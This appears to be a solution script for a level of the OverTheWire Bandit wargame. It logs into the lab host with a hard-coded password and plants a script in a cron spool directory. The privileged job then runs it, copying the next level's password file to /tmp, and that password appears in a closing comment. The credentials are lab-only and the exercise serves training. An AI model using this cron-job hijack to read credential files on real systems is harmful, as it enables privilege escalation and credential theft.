#!/usr/bin/env bash

sshpass -p jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n ssh bandit23@bandit.labs.overthewire.org -p 2220

echo '#!/usr/bin/env bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_output' > /var/spool/bandit24/payload.sh
chmod 777 /var/spool/bandit24/payload.sh
watch cat /var/spool/bandit24/payload.sh
cat /tmp/bandit24_output
# UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
